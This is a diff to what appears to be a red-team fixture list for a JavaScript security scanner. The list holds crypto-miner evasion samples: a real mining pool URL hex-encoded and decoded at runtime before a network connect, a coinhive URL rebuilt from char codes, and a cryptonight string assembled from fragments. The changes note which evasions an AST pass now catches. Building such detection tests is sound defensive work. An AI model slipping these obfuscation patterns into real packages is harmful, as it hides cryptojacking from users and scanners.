@@ -94,8 +94,8 @@ module.exports = [
     id: 'miner-hex-pool',
     category: 'crypto-miner', technique: 'hex-config-evasion', severity: 'CRITICAL',
     expected: 'BLOCK', knownBypass: true,
-    description: 'Pool URL held as a hex blob, decoded at runtime, never eval\'d',
-    code: `const h = '73747261747576... '; const pool = Buffer.from(h.trim(), 'hex').toString(); module.exports = () => require('net').connect(pool);`,
+    description: 'Pool URL held as a hex blob, decoded at runtime, never eval\'d. CLOSED under FW_ENABLE_AST=1 (Phase 3, opt-in): Buffer.from(literal, \'hex\').toString() is folded and the decoded URL re-matched against the existing signature set — see `npm run redteam:ast`. (The hex payload here must be a complete, real encoding for the fold to produce a matchable string — an earlier version of this fixture used a truncated placeholder that decoded to garbage and never demonstrated closure.)',
+    code: `const h = '${Buffer.from('stratum+tcp://pool.hashvault.pro:443').toString('hex')}'; const pool = Buffer.from(h.trim(), 'hex').toString(); module.exports = () => require('net').connect(pool);`,
   },
   {
     id: 'miner-env-pool',
@@ -108,14 +108,14 @@ module.exports = [
     id: 'miner-charcode-coinhive',
     category: 'crypto-miner', technique: 'charcode-evasion', severity: 'CRITICAL',
     expected: 'BLOCK', knownBypass: true,
-    description: 'Brand name reconstructed from char codes to dodge the literal',
+    description: 'Brand name reconstructed from char codes to dodge the literal. CLOSED under FW_ENABLE_AST=1 (Phase 3, opt-in): String.fromCharCode with all-literal args is folded and re-matched — see `npm run redteam:ast`.',
     code: `const brand = String.fromCharCode(99,111,105,110,104,105,118,101); const url = 'https://' + brand + '.com/lib.js'; module.exports = url;`,
   },
   {
     id: 'miner-concat-cryptonight',
     category: 'crypto-miner', technique: 'string-concat-evasion', severity: 'CRITICAL',
     expected: 'BLOCK', knownBypass: true,
-    description: 'cryptonight algorithm string assembled from fragments',
+    description: 'cryptonight algorithm string assembled from fragments. CLOSED under FW_ENABLE_AST=1 (Phase 3, opt-in): literal string concatenation is folded and re-matched — see `npm run redteam:ast`.',
     code: `const algo = 'crypto' + 'night'; module.exports = { hash: (b) => native.hash(b, algo) };`,
   },
   {
